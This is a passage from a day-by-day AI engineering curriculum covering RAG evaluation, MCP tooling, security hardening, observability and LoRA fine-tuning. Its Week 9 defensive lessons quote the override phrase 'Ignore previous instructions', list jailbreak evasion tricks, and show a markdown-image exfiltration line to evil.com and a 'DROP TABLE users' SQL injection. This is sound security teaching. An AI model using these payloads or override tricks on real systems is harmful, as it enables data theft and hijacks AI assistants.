- [ ] **Done when:** Telemetry logs prove the top-ranked chunk after reranking is objectively more relevant than the top chunk before reranking.

### Day 40 — Query expansion: HyDE and multi-angle search
- [ ] Conversational query rewriting: resolving vague pronouns and follow-up context ('What was its revenue that year?')
- [ ] Hypothetical Document Embeddings (HyDE): prompting an LLM to generate a speculative answer, then embedding that fantasy answer to find real matches
- [ ] Multi-query expansion: generating 3 distinct search formulations of a user question and unioning candidate sets
- [ ] **Build:** a query transformation pre-processor that expands ambiguous user prompts before hitting the search index
- [ ] **Done when:** A vague 3-word question is rewritten into a high-signal search query that successfully surfaces the exact target document.

### Day 41 — Multi-tenant iron fences: pre-filtering vector search
- [ ] Data leakage risks: why post-filtering search results by permissions violates privacy and destroys retrieval recall
- [ ] Metadata pre-filtering: enforcing hard index partition masks (`tenant_id == 'org_99'`, `permissions IN [...]`) during HNSW graph traversal
- [ ] Index performance under tenant isolation: balancing shared multi-tenant tables vs dedicated tenant indexes
- [ ] **Build:** write automated security tests proving User A cannot retrieve documents owned by User B under any adversarial query
- [ ] **Done when:** Adversarial tests confirm two users with different security clearances receive completely isolated search results with zero data leakage.

### Day 42 — The Millisecond Waterfall: retrieval latency budgeting
- [ ] Construct the retrieval latency waterfall: Query Embed (45ms) + Hybrid Search (15ms) + RRF Merge (2ms) + Cross-Encoder Rerank (40ms)
- [ ] Profile and eliminate pipeline bottlenecks: connection pooling, async query dispatch, and reranker batching
- [ ] Document the retrieval architecture, index configuration, and latency SLA guarantees
- [ ] **Done when:** Your end-to-end retrieval p95 latency stays strictly within an 120ms budget across 50 concurrent test queries.

---

## Week 7 — Rigorous Retrieval & Generation Evaluation (The Iron Caliper & The Lie Detector)
*Days 43–49*

**Outcome: "I can quantitatively prove my RAG pipeline improves using Recall@k, MRR, and Faithfulness judges wired into automated CI regression gates."**

### Day 43 — The ground truth: hand-crafting the 40-question golden set ⭐
- [ ] Why synthetic LLM-generated evals mislead: the irreplaceable gold standard of 40 hand-verified evaluation cases
- [ ] Anatomy of an evaluation fixture: user query, ground-truth chunk IDs, canonical reference answer, and query category
- [ ] Using `datasets/golden_rag_eval.json` as a template to build a domain-specific evaluation dataset for your corpus
- [ ] **Build:** curate and commit a 40-question golden evaluation dataset with verified ground-truth chunk citations
- [ ] **Done when:** You have a committed, validated JSON golden dataset containing 40 real questions with exact ground-truth chunk ID mappings.

### Day 44 — Retrieval scorecards: Recall@k and Mean Reciprocal Rank (MRR)
- [ ] Recall@k mathematically: the percentage of evaluation queries where the ground-truth chunk appeared in the top $k$ results
- [ ] Mean Reciprocal Rank (MRR): measuring rank position quality ($\frac{1}{\text{rank}}$) to reward placing the right chunk at position 1
- [ ] Benchmarking configurations: comparing baseline pure vector vs BM25 vs hybrid RRF vs cross-encoder reranked search
- [ ] **Build:** an automated evaluation script that calculates Recall@1, Recall@5, and MRR across your golden set
- [ ] **Done when:** You have an objective scorecard proving your hybrid + rerank pipeline beats pure vector search by at least +20% on Recall@5.

### Day 45 — Generation lie detectors: Faithfulness and Answer Relevance
- [ ] Evaluating generative answers: using an LLM-as-a-Judge with strict structured scoring rubrics instead of human vibes
- [ ] Faithfulness / Groundedness: decomposing answers into atomic statements and verifying that every single claim is backed by retrieved context
- [ ] Answer Relevance: detecting evasive answers, hallucinated extrapolations, or refusal failures
- [ ] **Build:** an evaluation judge that inspects answer-context pairs and outputs a faithfulness score (0.0 to 1.0) with reasoning traces
- [ ] **Done when:** Your evaluation judge flags an intentionally hallucinated answer with a Faithfulness score of 0.0 and cites the unsupported sentence.

### Day 46 — The evaluation engine: building the automated test runner
- [ ] Evaluation runner architecture: Golden Dataset -> Pipeline Runner -> Metric Judge -> Aggregator -> Scorecard
- [ ] Async batch execution: evaluating 40 questions concurrently with semaphore concurrency limits to avoid provider rate limits
- [ ] Telemetry artifact generation: outputting formatted markdown comparison tables and committing JSON evaluation runs to git
- [ ] **Build:** author a standalone CLI command `python3 eval.py` that executes the full benchmark and displays a summary scorecard
- [ ] **Done when:** Executing `python3 eval.py` runs all 40 test cases across retrieval and generation, printing a clean metrics scorecard in under 30 seconds.

### Day 47 — Verifiable citations: anchoring claims to source chunk IDs
- [ ] Prompting for precision: instructing models to attach strict inline source citations (`[Chunk 12]`) to every factual claim
- [ ] Citation verification engine: writing an automated post-processor that verifies cited chunk IDs actually exist in the retrieved context
- [ ] Refusal calibration: conditioning the model to emit "I do not have enough verified context to answer" when retrieval confidence is low
- [ ] **Build:** a generation pipeline that returns responses with clickable, verified source chunk citations
- [ ] **Done when:** Every claim in the generated answer links to an existing retrieved chunk, and zero unsupported claims slip through.

### Day 48 — CI regression tripwires: breaking builds on quality drops
- [ ] Wiring evals into continuous integration: executing `make eval` inside GitHub Actions on every pull request
- [ ] Configuring quality tripwires: failing the CI build if Recall@5 drops by more than 1.5% or Faithfulness falls below 0.90
- [ ] Using disk-backed LLM response caching in CI to run prompt regressions instantly with zero repeated API spend
- [ ] **Build:** a GitHub Actions workflow that runs your evaluation suite on every PR and comments with a metrics diff table
- [ ] **Done when:** Deliberately degrading your retrieval weights or prompt template turns your GitHub Actions CI check red.

### Day 49 — Ship: Measured RAG System with CI Benchmarks
- [ ] Deploy your production RAG service with live citation linking, health probes, and metrics endpoints
- [ ] Write an authoritative README leading with the quantitative evaluation scorecard (Vector vs BM25 vs Hybrid vs Reranked)
- [ ] Take a half-day off: you have crossed the chasm that separates amateur demo builders from professional AI engineers
- [ ] **Done when:** Your RAG README opens with verified retrieval numbers (Recall@5: 92%, MRR: 0.84) that you can defend under scrutiny in any interview.

---

## Week 8 — Tools, MCP & Deterministic Agent Workflows (Robot Arms & The Switchboard)
*Days 50–56*

**Outcome: "My system can execute actions in the physical world through standardized protocols, tool error repair, and bounded state machines."**

### Day 50 — Tool execution mechanics: JSON Schemas and local runtimes
- [ ] How function calling physically works: passing JSON Schema function signatures in the prompt, intercepting tool-call tokens, and running Python code
- [ ] Parallel tool calls: handling models that emit multiple simultaneous function invocations in a single completion turn
- [ ] Packing tool results: serializing function return values into observation message envelopes and returning them to context
- [ ] **Build:** an assistant equipped with 4 local tools (search, calculator, file write, system clock) that executes functions and reports answers
- [ ] **Done when:** The model emits valid JSON tool calls, your Python runtime executes the functions, and the model synthesizes the answer from tool output.

### Day 51 — Tool resilience: exception feedback and self-correction
- [ ] What happens when tools crash: why raising 500 errors destroys agent execution and how returning exceptions as observations enables self-repair
- [ ] Guiding parameter correction: feeding invalid argument error traces back to the model so it corrects its own syntax on the next turn
- [ ] Defensive execution: enforcing execution timeouts (5s) and catch-all exception wrappers around third-party tool code
- [ ] **Build:** simulate a tool exception (e.g. invalid date string) and verify that the model analyzes the error and self-corrects on the next turn
- [ ] **Done when:** A tool that raises a ValueError produces a polite self-repair from the model instead of an unhandled application crash.

### Day 52 — The bounded agent loop: state, termination, and circuit breakers
- [ ] The core agent loop: Plan -> Act -> Observe -> Evaluate -> Terminate
- [ ] Loop circuit breakers: enforcing hard limits on maximum tool iterations (10 steps) and total execution time (30 seconds) to prevent infinite loops
- [ ] Context compaction: summarizing or discarding intermediate tool observation history to prevent overflowing the context window
- [ ] **Build:** a multi-step research agent that executes iterative tool actions and terminates reliably when its objective is met
- [ ] **Done when:** Your agent successfully executes a 4-step research plan and is structurally incapable of looping beyond 10 steps.

### Day 53 — The Model Context Protocol (MCP): universal tool switchboards ⭐
- [ ] Understanding MCP: why Anthropic's open protocol solves the $M \times N$ custom integration problem for tools and resources
- [ ] MCP protocol architecture: JSON-RPC 2.0 messages traveling over stdio or Server-Sent Events (SSE) transports
- [ ] Exposing your Week 6 RAG pipeline as a standardized MCP tool (`search_knowledge_base`) and document resource
- [ ] **Build:** a production MCP server using the official Python SDK that exposes your knowledge base to any compatible client
- [ ] **Done when:** Your MCP server responds cleanly to standard `tools/list` and `tools/call` JSON-RPC protocol requests over stdio.

### Day 54 — Connecting MCP: plugging into IDEs and desktop agents
- [ ] Wiring your MCP server into desktop clients: configuring Claude Desktop, Cursor, or AI CLI agents via configuration manifests
- [ ] Debugging MCP traffic: monitoring JSON-RPC handshakes, message logging, and handling unexpected transport disconnects
- [ ] Security boundaries for MCP: restricting filesystem access and sanitizing tool arguments passed from desktop clients
- [ ] **Build:** configure Claude Desktop or Cursor to query your custom MCP knowledge base directly during coding workflows
- [ ] **Done when:** You can open Claude Desktop or Cursor and ask questions about your private documents via your live MCP server.

### Day 55 — Compound AI systems: deterministic state machines over free-floating agents ⭐
- [ ] The senior rule: "If you can draw the flowchart, write code, not an autonomous agent"
- [ ] The 4 Compound AI patterns: Router, Orchestrator-Workers, Evaluator-Optimizer, and Parallel Consensus
- [ ] State machines with Pydantic AI or LangGraph: modeling state transitions as typed directed graphs with guard assertions
- [ ] **Build:** a customer request workflow combining a deterministic Router with an Evaluator-Optimizer feedback loop
- [ ] **Done when:** Every state transition in your workflow is deterministic, individually unit-tested, and mathematically incapable of infinite recursion.

### Day 56 — Ship #2: Enterprise Knowledge Assistant with MCP Tooling
- [ ] Publish Project 2 repository containing your hybrid RAG engine, MCP server, state machine workflow, and CI eval suite
- [ ] Author a comprehensive README: MCP setup guide, architecture flowcharts, latency breakdown, and Recall@k benchmarks
- [ ] Verify single-command installation: ensure a user can run your MCP server locally with `uv run` in under 15 seconds
- [ ] **Done when:** Project 2 is live, public on GitHub, and verified working with standard MCP clients. Month 2 complete!

---

## Week 9 — Production Security & Adversarial Hardening (Poisoned Letters & Iron Fences)
*Days 57–63*

**Outcome: "My AI system resists indirect prompt injection, protects sensitive credentials, and safely executes tools inside isolated sandboxes."**

### Day 57 — Poisoned context: indirect prompt injection attacks ⭐
- [ ] Direct vs indirect prompt injection: why untrusted data (emails, scraped webpages, PDF uploads) is the #1 vulnerability in production AI
- [ ] Attack taxonomy: instruction overrides ('Ignore previous instructions'), role hijacking, and delimiter breakouts
- [ ] Attacking your Day 56 assistant: crafting 15 distinct hostile payloads hidden inside documents and evaluating model compliance
- [ ] **Build:** author an automated adversarial security test suite containing 15 real-world injection attack vectors
- [ ] **Done when:** You have a committed test suite demonstrating exactly how unhardened prompts succumb to hidden document injections.

### Day 58 — Data exfiltration and PII scrubbing: locking the perimeter
- [ ] Exfiltration attack vectors: tricking models into rendering tracking markdown images (`![leak](https://evil.com?data=...)`) or encoding secrets in URLs
- [ ] Personally Identifiable Information (PII) scrubbing: detecting and redacting credit cards, SSNs, and emails with Microsoft Presidio and regex
- [ ] Client-side sanitization: stripping sensitive customer data before it ever crosses the network to external model providers
- [ ] **Build:** an async pre-processing middleware that intercepts inbound prompts and redacts sensitive PII with zero latency penalty
- [ ] **Done when:** Test queries containing realistic fake credit cards and SSNs have all PII redacted with tokens (`[REDACTED_SSN]`) before reaching the model.

### Day 59 — Defense-in-depth: XML boundary fencing and dual-LLM guards
- [ ] Structural isolation: wrapping untrusted user inputs and retrieved chunks in strict XML tags (`<untrusted_content>`) with system prompt warnings
- [ ] Dual-LLM architecture: deploying a fast, cheap model as an isolated security guard checking untrusted inputs before passing them to the primary model
- [ ] Output guardrails: scanning model completions to ensure internal system instructions or secret prompt templates are never reflected back
- [ ] **Build:** implement XML boundary fencing and a dual-LLM guardrail filter that neutralizes the injection attacks created on Day 57
- [ ] **Done when:** All 15 injection payloads from Day 57 are successfully neutralized by your boundary fence without degrading answer quality.

### Day 60 — Tool sandboxing: defusing dangerous system calls
- [ ] The danger of autonomous tool execution: SQL injections, arbitrary code execution, and unauthorized filesystem modifications
- [ ] AST validation for database tools: parsing SQL with `sqlglot` to permit strictly read-only `SELECT` statements and reject `DROP`/`UPDATE`
- [ ] Container and WASM sandboxing: executing untrusted Python or shell code inside isolated ephemeral Docker containers with no network access
- [ ] **Build:** a hardened SQL query tool that inspects the syntax tree and aborts immediately on any write or schema-modifying operation
- [ ] **Done when:** An attempted SQL injection (`SELECT *; DROP TABLE users;`) is intercepted and blocked at the AST parser level before touching the database.

### Day 61 — Human-in-the-loop: cryptographic approval gates for high-risk actions
- [ ] Action risk classification: partitioning operations into Green (autonomous read-only) vs Red (destructive writes, wire transfers, email sends)
- [ ] State suspension: freezing agent execution state and emitting an approval request ticket with an expiration TTL
- [ ] Cryptographic approval tokens: resuming workflow execution only upon receipt of a signed HMAC approval token from a human operator
- [ ] **Build:** implement a human approval interrupt for financial or data deletion actions with a simulated Slack/webhook callback
- [ ] **Done when:** An agent attempting a destructive action halts execution, sends an approval ticket, and resumes only after receiving a valid authorization token.

### Day 62 — Red-teaming gauntlet: ruthless adversarial penetration testing
- [ ] Conduct an uninterrupted 2-hour red-teaming drill attacking your own production systems from an adversarial perspective
- [ ] Test complex evasion vectors: unicode character homoglyphs, multi-language prompt switching, base64 obfuscation, and persona roleplay
- [ ] Document every successful penetration, map the root cause, and rate severity using CVSS criteria
- [ ] **Build:** author a comprehensive Threat Model and Security Assessment document (`SECURITY.md`)
- [ ] **Done when:** You have a documented vulnerability report cataloging tested attack vectors, root-cause mechanics, and prioritized engineering fixes.

### Day 63 — Ironclad defenses: automated security regression tests in CI
- [ ] Implement engineering patches for the top two vulnerabilities uncovered during your Day 62 red-teaming gauntlet
- [ ] Convert successful attack payloads into permanent automated pytest fixtures in your CI pipeline
- [ ] Publish a formal Security Policy (`SECURITY.md`) detailing vulnerability reporting procedures and defensive guarantees
- [ ] **Done when:** Your automated security test suite executes in CI on every push, ensuring patched prompt injection vulnerabilities can never regress.

---

## Week 10 — Observability, Tracing & Production Operations (Mission Control & The Flight Recorder)
*Days 64–70*

**Outcome: "Every token, millisecond, and dollar is traced in real time, and user feedback continuously drives automated regression test cases."**

### Day 64 — Distributed tracing with Langfuse: the production flight recorder ⭐
- [ ] Why logs are dead: the necessity of distributed trace waterfalls for multi-step AI pipelines (User -> RAG -> Rerank -> LLM -> Tool)
- [ ] Setting up Langfuse (cloud or self-hosted Docker) and integrating the Python SDK
- [ ] Instrumenting nested spans: capturing inputs, outputs, token counts, model names, and latency across every individual pipeline step
- [ ] **Build:** instrument your Day 56 assistant with Langfuse so every user interaction generates an observable execution waterfall
- [ ] **Done when:** You can open a web dashboard and view the full visual waterfall trace for any request, showing exact latency and cost per span.

### Day 65 — Mission control dashboards: latency, cost, and throughput telemetry
- [ ] Key production metrics: p50/p95/p99 latency percentiles, cost per user organization, token velocity, and error rates
- [ ] Building monitoring widgets: tracking hourly token consumption by model version and isolating high-cost user queries
- [ ] Setting up production tripwires: alerting on abnormal cost spikes ($10/hr threshold) or elevated p95 latency degradations (>3s)
- [ ] **Build:** configure production monitoring dashboards with cost tracking, latency histograms, and alert thresholds
- [ ] **Done when:** Your dashboard displays live telemetry graphs of request volume, p95 latency percentiles, and cumulative dollar spend.

### Day 66 — Privacy-compliant telemetry: scrubbing secrets from trace storage
- [ ] The dark side of tracing: accidentally leaking customer passwords, credit cards, or API tokens into third-party observability stores
- [ ] Client-side trace sanitization: writing middleware to scrub authorization headers, session cookies, and regex PII before emitting spans
- [ ] Compliance engineering: setting data retention policies and establishing audit logs for GDPR, HIPAA, and SOC2 compliance
- [ ] **Build:** implement a trace masking filter that guarantees sensitive credentials and user PII never reach your observability database
- [ ] **Done when:** Inspecting raw database traces confirms that zero authorization tokens or sensitive customer PII appear in telemetry storage.

### Day 67 — Forensic error analysis: clustering production failures
- [ ] The senior approach to debugging: exporting 50 real production failure traces rather than guessing prompt fixes
- [ ] Building a failure taxonomy: categorizing failures into Retrieval Miss (35%), Schema Invalidation (20%), User Ambiguity (30%), Hallucination (15%)
- [ ] Error analysis methodology: letting empirical failure clusters prioritize engineering tasks instead of subjective intuition
- [ ] **Build:** author a categorized failure taxonomy report ranking your system's production failures by frequency and impact
- [ ] **Done when:** You have a ranked Pareto chart showing the exact percentage breakdown of why your system fails in production.

### Day 68 — User telemetry: capturing implicit signals and explicit feedback
- [ ] Feedback modalities: implicit signals (copy-to-clipboard, dwell time, regeneration clicks) vs explicit signals (thumbs up/down, star ratings)
- [ ] Binding feedback to trace IDs: attaching user ratings and textual comments directly to Langfuse execution traces via API
- [ ] Building a defect review queue: filtering observability dashboards to inspect low-rated conversations for systemic flaws
- [ ] **Build:** create a feedback endpoint that allows frontend users to submit thumbs up/down ratings linked directly to trace IDs
- [ ] **Done when:** Submitting a thumbs-down in your UI immediately flags the corresponding execution trace in your Langfuse dashboard for review.

### Day 69 — Closing the loop: turning production defects into golden eval cases
- [ ] Why static test sets decay: real users discover edge cases and ambiguities you never anticipated in development
- [ ] The automated fly-wheel: harvesting production thumbs-down traces and promoting them into your golden evaluation dataset
- [ ] Labeling ground truth: establishing canonical chunks and reference answers for newly discovered production failure modes
- [ ] **Build:** export 10 failed production queries from Langfuse and convert them into permanent test fixtures in your golden eval suite
- [ ] **Done when:** Your golden evaluation dataset expands with 10 real production failure cases, ensuring those exact defects can never recur.

### Day 70 — Production runbooks: SLAs, circuit cascades, and failover drills
- [ ] Defining Service Level Objectives (SLOs): 99.5% service availability, p95 latency under 2.5s, and error rates below 0.5%
- [ ] Automated provider cascades: orchestrating failover from primary provider (OpenAI) to secondary (Anthropic) to tertiary (local open model)
- [ ] Authoring the Operations Runbook: documenting step-by-step triage procedures for rate limit storms, provider outages, and database locks
- [ ] **Build:** conduct a live fire drill simulating a primary provider outage and verify automated failover to your secondary model
- [ ] **Done when:** Simulating an upstream provider blackout triggers an automated failover within 500ms without dropping user connections.

---

## Week 11 — Open Source Models & LoRA Fine-Tuning (The Local Foundry & The Adapter Sleeve)
*Days 71–77*

**Outcome: "I can serve open models on local metal with vLLM PagedAttention and use data to prove when LoRA fine-tuning beats prompt engineering."**

### Day 71 — Local metal: running open weights with Ollama and llama.cpp
- [ ] Why self-host: data sovereignty, zero external API latency, regulatory compliance, and offline operational guarantees
- [ ] Running open models (Llama 3.1 8B, Qwen 2.5, Mistral 7B) locally on Apple Silicon or Linux GPUs using Ollama and llama.cpp
- [ ] Interacting via OpenAI-compatible REST endpoints (`http://localhost:11434/v1`) using standard client libraries
- [ ] **Build:** point your Week 4 extraction pipeline to a locally hosted open model and execute an extraction completely offline
- [ ] **Done when:** Your entire structured extraction and search pipeline executes end-to-end with your machine completely disconnected from the internet.

### Day 72 — High-throughput serving: PagedAttention and continuous batching with vLLM
- [ ] The multi-user bottleneck: why naive HuggingFace pipelines choke and run out of GPU memory under concurrent traffic
- [ ] PagedAttention mechanics: managing Key-Value (KV) cache memory like OS virtual memory pages to eliminate memory fragmentation
- [ ] Continuous batching: dynamically pairing incoming and completing token sequences to maximize GPU tensor core utilization
- [ ] **Build:** deploy an open model with vLLM and benchmark throughput under concurrent load against a standard inference baseline
- [ ] **Done when:** You can draw a diagram explaining how PagedAttention allocates non-contiguous KV-cache memory blocks to serve 10x more users.

### Day 73 — Quantization economics: FP16, INT8, 4-bit, and VRAM arithmetic
- [ ] Quantization math: compressing 16-bit floating-point weights into 4-bit integer representations (AWQ, GPTQ, GGUF)
- [ ] The physical memory equation: calculating exact GPU VRAM requirements: $\text{VRAM} = (\text{parameters} \times \text{bytes\_per\_weight}) + \text{KV\_cache}$
- [ ] Measuring perplexity degradation: evaluating reasoning loss across 4-bit vs 8-bit vs 16-bit weight representations
- [ ] **Build:** run benchmark inference comparing memory usage, tokens per second, and perplexity across 4-bit and 8-bit quantized weights
- [ ] **Done when:** You can calculate on a whiteboard the exact GPU VRAM in gigabytes required to host any model at a 32k context length.

### Day 74 — The fine-tuning balance sheet: when to tune vs when to prompt ⭐
- [ ] When fine-tuning is the winning move: enforcing rigid bespoke schemas, dropping latency by eliminating long prompts, or distilling large models
- [ ] When fine-tuning is an expensive trap: trying to inject dynamic factual knowledge (which is what RAG does) or working with <500 examples
- [ ] The total cost of ownership: data curation overhead, training compute costs, and perpetual model maintenance vs prompt iteration speed
- [ ] **Build:** author a technical decision matrix analyzing an enterprise use case and defend why fine-tuning is or is not justified
- [ ] **Done when:** You can defend your decision with quantitative data: explaining why 'Prompting + RAG' is usually the senior choice.

### Day 75 — Synthetic data distillation: generating training pairs with frontier models
- [ ] Teacher-student distillation: prompting a frontier model (Claude 3.5 Sonnet / GPT-4o) to generate diverse, high-quality instruction-response pairs
- [ ] Data quality filtering: applying LLM-as-a-judge heuristics, schema checks, and deduplication to purge low-quality or corrupt training rows
- [ ] Formatting datasets: converting raw data into standardized ChatML format stored as clean JSONL files
- [ ] **Build:** generate, filter, and validate a 300-example high-signal synthetic training dataset for a specialized extraction task
- [ ] **Done when:** Your synthetic training dataset passes strict JSONL validation, contains zero duplicate samples, and achieves 100% schema compliance.

### Day 76 — LoRA mechanics: training low-rank adapter sleeves
- [ ] Low-Rank Adaptation (LoRA) mechanics: freezing multi-billion parameter base weights and training tiny rank decomposition matrices ($W = W_0 + B \cdot A$)
- [ ] Hyperparameter tuning: selecting Rank ($r=8, 16, 32$), Alpha scaling ($\alpha = 2r$), target projection modules, and learning rate schedules
- [ ] Executing a LoRA fine-tuning run on a hosted GPU instance (Unsloth, Modal, or RunPod) in under 30 minutes for less than $2.00
- [ ] **Build:** fine-tune an open 8B model (Llama 3.1 8B or Qwen 2.5 7B) on your custom dataset and export the trained LoRA adapter weights
- [ ] **Done when:** Your training loss curves converge smoothly without overfitting and output a validated LoRA adapter checkpoint file.

### Day 77 — The showdown: fine-tuned adapter vs prompt-engineered baseline
- [ ] Run a head-to-head shootout: evaluate your fine-tuned 8B model against the prompt-engineered base model on an unseen evaluation test set
- [ ] Compare key production metrics: schema compliance rate, p95 latency, input token overhead, and dollar cost per 1,000 queries
- [ ] Calculate the financial break-even point: at what daily query volume does fine-tuning pay back its initial dataset and training costs?
- [ ] **Build:** author a comparative evaluation report with side-by-side completion diffs, latency graphs, and cost comparisons
- [ ] **Done when:** You have a data-backed report proving whether your fine-tuned adapter outperformed the prompt-engineered baseline on accuracy, latency, and cost.

---

## Week 12 — Capstone Platform, Playbook & Career Positioning (The Fortress & The Flight Log)
*Days 78–84*

**Outcome: "I have shipped an end-to-end production AI platform, authored an emergency outage playbook, and can answer senior system design questions cold."**

### Day 78 — Capstone architecture: blueprints for a production AI platform
- [ ] Architectural scoping: design a production AI platform solving a real problem that you will continue using every single week
- [ ] Full-stack synthesis: combine Ingestion + Hybrid Search (BM25 + Dense) + Cross-Encoder + MCP + State Machine + Langfuse Tracing
- [ ] Define enterprise boundaries: tenant data isolation, authentication, rate limiting quotas, and fallback cascades
- [ ] **Build:** author the comprehensive System Architecture Document and detailed component dataflow diagram for your capstone
- [ ] **Done when:** Your architecture document specifies every component interface, data schema, latency budget, and security fence.

### Day 79 — Platform assembly: end-to-end system integration
- [ ] Wire the user interface (Streamlit, Next.js, or CLI) to your battle-hardened async FastAPI backend
- [ ] Connect real-time SSE token streaming with live, interactive inline citation linking to retrieved document chunks
- [ ] Hook up distributed tracing via Langfuse to capture end-to-end request spans from UI click to completion
- [ ] **Build:** execute complete integration tests proving that user queries flow through search, reranking, generation, and tracing cleanly
- [ ] **Done when:** A user can submit a complex query in the UI, watch tokens stream with live source citations, and see the full trace recorded in Langfuse.

### Day 80 — Stress-testing under fire: load generation and bottleneck profiling
- [ ] Simulate high-concurrency production load: run Locust or k6 to pound your endpoints with 20+ concurrent synthetic users
- [ ] Profile system bottlenecks under pressure: vector database connection saturation, async event loop stalls, and memory consumption
- [ ] Optimize performance: tune HTTP connection pools, cache frequently requested queries, and adjust concurrency semaphores
- [ ] **Build:** execute a sustained 15-minute load test and record p50, p95, and p99 latency percentiles and error rates under load
- [ ] **Done when:** Your platform maintains a 99%+ success rate with p95 latency under 2.5 seconds during sustained multi-user load testing.

### Day 81 — The emergency manual: authoring the Production Failure Playbook ⭐
- [ ] Document real failure scenarios: primary provider blackouts, 429 rate limit throttling storms, vector index corruption, and injection breaches
- [ ] Author step-by-step incident response runbooks: exact detection queries, root-cause diagnosis commands, and emergency remediation steps
- [ ] Document fallback procedures: manual provider failover switches, index rebuild commands, and degraded read-only operational modes
- [ ] **Build:** author the complete Production Failure Playbook in `PLAYBOOK.md` detailing 5 real-world outage scenarios
- [ ] **Done when:** A junior engineer on call at 2 AM reading your playbook knows the exact commands to run to diagnose and resolve an outage.

### Day 82 — Shipping the technical narrative: the deep-dive architectural write-up ⭐
- [ ] Why technical write-ups get you hired: engineering leaders look for trade-off reasoning, economic awareness, and honesty about what broke
- [ ] Structure the write-up: The Problem -> Architecture -> Engineering Trade-offs -> Empirical Evaluation Scorecard -> What Failed & Lessons
- [ ] Lead with real numbers: cite exact dollars per query, p95 millisecond waterfalls, Recall@5 metrics, and load test throughput
- [ ] **Build:** publish your comprehensive technical deep-dive write-up on your technical blog or as a GitHub repository showcase
- [ ] **Done when:** A stranger reading your write-up immediately understands your architectural decisions, cost economics, and engineering maturity.

### Day 83 — The senior technical gauntlet: drilling the 25 core questions
- [ ] Review the 25 Senior AI Engineering Questions in Section 4 of the 90-day plan
- [ ] Practice answering every question out loud without checking notes, using physical mechanisms, exact numbers, and trade-off comparisons
- [ ] Conduct an adversarial mock technical interview: defend your Capstone architecture, design choices, and failure playbooks under pressure
- [ ] **Drill:** time yourself giving 2-minute crisp answers with zero hand-waving or corporate fluff
- [ ] **Done when:** You can answer all 25 senior questions cold with mechanical precision, citing exact trade-offs, numbers, and physical realities.

### Day 84 — Ship #3 (Capstone): Production AI Platform Launch & Verification
- [ ] Launch your public Capstone repository with live demo links, architecture diagrams, and the Production Failure Playbook
- [ ] Execute full load tests: verify 50 concurrent streaming sessions with zero connection drops
- [ ] Tag the Capstone release v1.0.0 with verified cryptographic SHA-256 manifests
- [ ] Celebrate completing the core 12-week platform build! You now enter the Days 85–90 Capstone Hardening & Hiring Sprint
- [ ] **Done when:** Your Capstone production system is deployed, load-tested, and live on the internet.

---

## Week 13 — Capstone Hardening & Hiring Sprint
*Days 85–90*

**Outcome: "Six days of battle-hardening: chaos engineering, tail latency profiling, SLO fencing, whiteboard defense, and production portfolio launch."**

### Day 85 — Chaos engineering: fault injection, 503 circuit breakers, and degraded mode fallbacks
- [ ] Simulate upstream model provider 503 outage and rate-limit storms with an adversarial HTTP proxy
- [ ] Implement circuit breaking in your client: trip after 5 consecutive failures and route to a fallback local/cheaper model
- [ ] Build graceful degradation: return cached or condensed answers when latency budget exceeds 3,000ms
- [ ] **Build:** write automated chaos test verifying zero unhandled 500 errors during a 60-second simulated upstream outage
- [ ] **Done when:** Your system gracefully degrades to cached/fallback models under simulated provider outages without dropping user requests.

### Day 86 — Cold-start benchmarking and latency tail trimming: profiling TTFT and p99 waterfalls
- [ ] Profile the latency waterfall of your RAG pipeline: chunk retrieval, embedding call, reranker, and TTFT
- [ ] Identify and fix p99 latency spikes: socket connection pooling, pre-warming TCP/TLS connections, and chunk pre-fetching
- [ ] Benchmark TTFT under concurrent loads (1, 10, 50 workers) and graph latency distribution percentiles
- [ ] **Build:** latency profiling harness that logs exact millisecond breakdowns for every pipeline stage to OpenTelemetry
- [ ] **Done when:** p99 TTFT is documented and optimized, with every millisecond accounted for in an OpenTelemetry waterfall trace.

### Day 87 — Production runbooks, SLO fencing, and the 2:00 AM incident response playbook
- [ ] Define concrete Service Level Objectives (SLOs): 99.5% availability, p95 TTFT < 1.2s, budget spend limit $50/day
- [ ] Write the 2:00 AM incident runbook: clear triage steps for token budget exhaustion, latency spikes, and poison prompt attacks
- [ ] Configure automated alerts and emergency kill-switches to halt agent loops before runaway costs occur
- [ ] **Build:** commit `RUNBOOK.md` with step-by-step diagnostic commands, rollback scripts, and emergency switches
- [ ] **Done when:** You have an actionable RUNBOOK.md that any on-call engineer can follow at 2:00 AM to diagnose and mitigate production outages.

### Day 88 — System architecture whiteboard defense: trade-offs, cost models, and failure modes
- [ ] Draw the complete physical architecture diagram of your Capstone: ingress, auth, queues, vector DB, model router, and observability
- [ ] Prepare crisp 2-minute spoken defenses for every key trade-off: Why Pinecone vs pgvector? Why hybrid RRF over dense-only? Why vLLM vs Ollama?
- [ ] Conduct a mock whiteboard interview with a peer or record yourself defending your architecture under aggressive questioning
- [ ] **Defense:** explain exactly how your system handles a 10x traffic spike and how unit costs scale with token volume
- [ ] **Done when:** You can defend every architectural component, trade-off, and failure recovery mechanism on a whiteboard with zero hesitation.

### Day 89 — Live technical coding and take-home challenge polish under time pressure
- [ ] Simulate a 60-minute live coding challenge: build a streaming SSE client with token cancellation from memory
- [ ] Simulate a second 60-minute challenge: write a custom hybrid search RRF reranker with pure Python without consulting external docs
- [ ] Review your code structure, docstrings, type annotations, and unit test coverage to ensure senior readability
- [ ] **Drill:** complete both live challenges cleanly within the 60-minute timebox with zero unhandled exceptions
- [ ] **Done when:** You can implement streaming clients, token buckets, and RRF rerankers in pure Python under a 60-minute live coding clock.

### Day 90 — Production Launch, Portfolio Showcase & The 90-Day Transformation Complete
- [ ] Publish your public portfolio repository with live demo links, architecture diagrams, and the Production Failure Playbook
- [ ] Publish your technical deep-dive engineering article documenting architecture, cost models, and lessons learned
- [ ] Send personalized, value-first outreach to 5 targeted engineering hiring managers with direct links to your shipped work
- [ ] Celebrate! You have conquered the complete 90-day transformation from zero to a battle-tested, employable production AI Engineer
- [ ] **Done when:** Your 3 production systems are live, public, and mathematically proven. You have completed the 90-day journey and are ready for senior engineering roles!

<!-- END GENERATED DAYS -->

---

## 4. The 25 Senior AI Engineering Questions You Must Answer Cold

1. **RAG vs. Fine-Tuning vs. Long-Context Prompt Caching:** How do you choose between them for a dynamic enterprise dataset of 500,000 pages? Break down the physical cost, latency, and knowledge update velocity trade-offs.
2. **BPE Tokenization Mechanics:** Why does a frontier model stumble when asked to count the letter 'r' in "strawberry" or reverse a 10-digit number? Explain the physical mechanism of Byte-Pair Encoding merges.
3. **Chunking Topography:** What is the physical failure mode of a naive 512-token fixed chunking window on complex technical documentation, and how does structural AST chunking with breadcrumb prepending fix context loss?
